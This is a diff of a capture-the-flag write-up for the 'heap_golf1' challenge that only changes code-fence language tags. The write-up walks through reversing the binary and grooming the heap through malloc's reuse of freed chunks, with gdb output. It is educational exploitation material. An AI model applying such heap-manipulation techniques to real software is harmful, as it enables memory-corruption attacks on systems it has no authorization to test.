@@ -3,7 +3,7 @@
 The goal of this challenge is to print the contents of `flag.txt`, not pop a shell.
 
 Let's take a look at the binary:
-```
+```console
 $	file heap_golf1 
 heap_golf1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=ea4a50178915e1adee07a464e42cec0d6f9a9f62, not stripped
 $ pwn checksec heap_golf1 
@@ -26,7 +26,7 @@ So we are dealing with a 64 bit binary that provides us with three different inp
 
 ## Reversing
 
-```
+```c
 
 undefined8 main(void)
 
@@ -91,7 +91,7 @@ So we can see what's going on. This is a heap grooming challenge. It stores and 
 Malloc will reuse previously freed chunks if they are the right size for performance reasons. What we can do is allocate `4` `0x20` block chunks (not including the one initially allocated), and then free them. Then when we allocate `0x20` byte chunks, we will get those same chunks back in the inverse order they were freed (so the last chunk we made will be the first allocated). Then the fourth chunk we allocate will be the first chunk allocated and have the same address as `target`, and also have the pointer counter `x` written to it:
 
 Pointers being freed in gdb (in this case it's `0x602260`):
-```
+```nasm
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
      0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
@@ -111,7 +111,7 @@ free@plt (
 )
 ```
 
-```
+```nasm
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
      0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
@@ -132,7 +132,7 @@ free@plt (
 ──────────────────────────────────────────────────────────────────────────────────────── threads ────
 ```
 
-```
+```nasm
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
      0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
@@ -152,7 +152,7 @@ free@plt (
 )
 ```
 
-```
+```nasm
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
      0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
@@ -172,7 +172,7 @@ free@plt (
 )
 ``` 
 
-```
+```nasm
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
      0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
@@ -194,7 +194,7 @@ free@plt (
 
 When they are reallocated:
 
-```
+```gdb
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x40084e <main+327>       mov    QWORD PTR [rbp-0x1a8], rax
      0x400855 <main+334>       mov    rax, QWORD PTR [rbp-0x1a8]
@@ -217,7 +217,7 @@ $1 = 0x1
 gef➤  p $rax
 ```
 
-```
+```gdb
 Breakpoint 2, 0x0000000000400862 in main ()
 gef➤  p $edx
 $3 = 0x2
@@ -225,7 +225,7 @@ gef➤  p $rax
 $4 = 0x6022c0
 ```
 
-```
+```gdb
 Breakpoint 2, 0x0000000000400862 in main ()
 gef➤  p $edx
 $5 = 0x3
@@ -233,7 +233,7 @@ gef➤  p $rax
 $6 = 0x602290
 ```
 
-```
+```gdb
 Breakpoint 2, 0x0000000000400862 in main ()
 gef➤  p $edx
 $7 = 0x4
@@ -243,7 +243,7 @@ $8 = 0x602260
 
 With that last iteration, we finally write the value `0x4` to the address of target `0x602260`. With that we can capture the flag.
 
-```
+```console
 $ /heap_golf1 
 target green provisioned.
 enter -1 to exit simulation, -2 to free course.
